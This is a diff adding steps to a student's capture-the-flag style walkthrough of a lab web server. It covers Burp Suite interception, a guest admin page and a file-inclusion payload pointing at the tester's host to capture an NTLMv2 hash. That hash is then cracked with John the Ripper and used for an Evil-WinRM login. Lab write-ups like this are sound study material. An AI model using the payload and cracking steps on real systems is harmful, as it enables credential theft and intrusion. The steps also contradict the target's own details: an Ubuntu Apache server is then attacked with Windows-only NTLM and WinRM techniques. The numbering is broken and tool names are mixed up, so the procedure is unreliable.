@@ -164,6 +164,18 @@
 
 ### 🛠️The process of solving task2
 
+### What is Burp?
+
+This is a intercepting proxy tool that allow security testers to capture, inspect, modify and forward HTTP(S) request and responses between browser and the serber.
+
+We download the Burp Suite and open the app by the command:
+
+ ```bash
+
+java -jar burpsuite_community_v2024.1.1.jar
+
+ ```
+
 1. First, I tried to open the main page at http://10.129.95.191 (target machine:    10.129.95.191), but it returned a blank or inaccessible page.
 
    To discover any hidden or unlisted directories on the server, I used Gobuster with a common wordlist:
@@ -183,7 +195,77 @@
 
    ![scan port](./image/Task5_login.jpg)
    
+   When i click the log in as guest , the url changed into http://10.129.95.191/cdn-cgi/login/admin.php.
 
+   The page exist but only can access as the guest.
+
+    ![scan port](./image/Task5_click.jpg)
+
+3. We use 'curl - I' to check admin page:
+
+   ```bash
+
+   curl -I http://10.129.95.191/cdn-cgi/login/admin.php
+
+   ```
+
+   get the result:
+
+   ```bash
+
+   HTTP/1.1 200 OK
+   Date: Thu, 03 Jul 2025 12:16:00 GMT
+   Server: Apache/2.4.29 (Ubuntu)
+   Content-Type: text/html; charset=UTF-8
+
+   ```
+
+   This means that the page exist and work normal.
+   
+5. When we click the log in as guest, Burp Suite to intercept this request.
+
+   Inside the HTTP history tab, i discovered the request :
+
+    ```bash
+
+    /cdn-cgi/login/admin.php
+
+    ```
+
+6. We can find the user flag from admin.php page:
+
+   ![scan port](./image/Task5_getuser.jpg)
+
+7. Now we need to get Root Flag:
+
+   Look for the potential vulerablities, we use Burp Suite Responder to intercept the login request.
+
+   ```bash
+
+   http://10.129.95.191/index.php?page=//10.10.14.6/somefile
+
+    ```
+
+   
+8.  Use John the Ripper to solve NTLMv2 Hash:
+
+    We copy and paste the hash from the responder into hash.txt and use rockyou to solve the hash.
+
+   ```bash
+   john --format=netntlmv2 --wordlist=~/rockyou.txt hash.txt
+
+   ```
+
+9. Login using Evil-WinRm and get the root flag:
+
+   ![scan port](./image/Task5_getRoot.jpg)
+
+
+## Task 3
+
+### Process of solving task 3
+
+    
    
    
    
